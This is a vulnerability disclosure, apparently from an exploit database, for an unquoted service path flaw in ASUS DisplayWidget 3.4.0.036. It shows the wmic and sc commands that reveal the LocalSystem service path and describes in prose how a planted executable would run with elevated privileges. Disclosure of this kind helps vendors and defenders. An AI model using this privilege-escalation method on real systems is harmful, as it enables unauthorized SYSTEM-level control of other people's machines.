    # Exploit Title: ASUS DisplayWidget Software 3.4.0.036 - 'ASUSDisplayWidgetService' Unquoted Service Path
    # Date: 2021-06-21
    # Exploit Author: Julio Aviña
    # Vendor Homepage: https://www.asus.com/
    # Software Link: https://dlcdnets.asus.com/pub/ASUS/LCD%20Monitors/MB16ACE/ASUS_DisplayWidget_3.4.0.036.exe.zip
    # Version: 3.4.0.036
    # Service File Version 1.0.0.1
    # Tested on: Windows 10 Pro x64 es
    # Vulnerability Type: Unquoted Service Path


    # 1. To find the unquoted service path vulnerability

    C:\>wmic service where 'name like "%ASUSDisplayWidgetService%"' get displayname, pathname, startmode, startname

    DisplayName                                      PathName                                                                        StartMode  StartName
    ASUS DisplayWidget Service by Portrait Displays  C:\Program Files\Portrait Displays\ASUS DisplayWidget\DisplayWidgetService.exe  Auto       LocalSystem

    # 2. To check service info:

    C:\>sc qc "ASUSDisplayWidgetService"
    [SC] QueryServiceConfig CORRECTO

    NOMBRE_SERVICIO: ASUSDisplayWidgetService
            TIPO               : 10  WIN32_OWN_PROCESS
            TIPO_INICIO        : 2   AUTO_START
            CONTROL_ERROR      : 1   NORMAL
            NOMBRE_RUTA_BINARIO: C:\Program Files\Portrait Displays\ASUS DisplayWidget\DisplayWidgetService.exe
            GRUPO_ORDEN_CARGA  :
            ETIQUETA           : 0
            NOMBRE_MOSTRAR     : ASUS DisplayWidget Service by Portrait Displays
            DEPENDENCIAS       :
            NOMBRE_INICIO_SERVICIO: LocalSystem


    # 3. Exploit:

    A successful attempt to exploit this vulnerability requires the attacker to insert an executable file into the service path undetected by the OS or some security application.
    When restarting the service or the system, the inserted executable will run with elevated privileges.